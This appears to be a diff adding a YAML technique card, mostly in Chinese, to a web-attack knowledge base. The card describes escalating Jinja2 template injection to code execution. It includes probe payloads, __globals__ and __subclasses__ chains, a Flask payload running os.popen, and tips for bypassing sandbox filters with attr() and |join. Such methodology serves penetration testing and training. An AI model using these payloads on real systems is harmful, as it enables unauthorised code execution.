@@ -1,0 +1,28 @@
+id: t008-ssti-jinja2-rce
+name: Jinja2 SSTI 到 RCE
+domain: web
+signal: 已确认 Jinja2 模板注入
+signal_en: confirmed Jinja2 SSTI, need code execution
+distinguish: 是 t004 的下一步；拿到对象链后才能 RCE。
+steps:
+- 探测：{{7*7}}、{{config}}、{{self.__class__.__mro__}}
+- 找 __subclasses__ 里的 Popen/FileLoader（下标随版本变，用脚本枚举）
+- 或走 __globals__ → os → popen
+- Flask 版可用 {{url_for.__globals__['os'].popen('ls').read()}}
+- Python3.11+ 许多链失效，改用 {{lipsum.__globals__}}
+traps:
+- 不要硬编码 __subclasses__ 下标，必须动态枚举
+- 沙箱可能 ban 了 __ 属性，用 attr() 过滤器和 |join 绕过
+tools:
+- sstimap
+keywords:
+- jinja2
+- ssti
+- rce
+- __globals__
+- __subclasses__
+- popen
+confidence: high
+review_status: verified
+reviewed_at: '2026-11-02'
+review_notes: 自动审核：结构/版本/危险取值/自洽性四项检查通过
